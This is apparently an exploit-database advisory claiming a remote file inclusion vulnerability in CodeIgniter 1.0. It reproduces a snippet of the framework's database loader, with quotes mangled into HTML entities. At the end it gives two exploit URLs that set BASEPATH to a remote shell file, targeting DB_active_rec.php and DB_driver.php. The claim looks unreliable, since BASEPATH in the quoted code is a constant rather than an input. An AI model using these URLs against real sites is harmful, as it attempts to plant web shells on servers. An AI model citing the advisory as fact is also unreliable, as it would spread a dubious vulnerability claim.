CodeIgniter v1.0 Remote File Inclusion Vulnerability
====================================================

###########################################################
###
### * @package    CodeIgniter
### * @Version    1.0
### * @license    http://codeigniter.com/user_guide/license.html
### * @link       http://codeigniter.com
###
###########################################################
###
### Type :  Remote File Inclusion Vulnerability
### Author: eidelweiss
###
###########################################################
 
POC:
require_once(BASEPATH.&#039;database/DB_driver&#039;.EXT);
 
    if ( ! isset($active_record) OR $active_record == TRUE)
    {
        require_once(BASEPATH.&#039;database/DB_active_rec&#039;.EXT);
 
        if ( ! class_exists(&#039;CI_DB&#039;))
        {
            eval(&#039;class CI_DB extends CI_DB_active_record { }&#039;);
        }
    }
    else
    {
        if ( ! class_exists(&#039;CI_DB&#039;))
        {
            eval(&#039;class CI_DB extends CI_DB_driver { }&#039;);
        }
    }
 
require_once(BASEPATH.&#039;database/drivers/&#039;.$params[&#039;dbdriver&#039;].&#039;/&#039;.$params[&#039;dbdriver&#039;].&#039;_driver&#039;.EXT);
 
    // Instantiate the DB adapter
    $driver = &#039;CI_DB_&#039;.$params[&#039;dbdriver&#039;].&#039;_driver&#039;;
    $DB =& instantiate_class(new $driver($params));
 
    if ($DB->autoinit == TRUE)
    {
        $DB->initialize();
    }
 
    return $DB;
}
 
###########################################################
### Exploit:     /system/database/DB_active_rec.php?BASEPATH=[Shell.txt?]
###     /system/database/DB_driver.php?BASEPATH=[Shell.txt?]
###########################################################



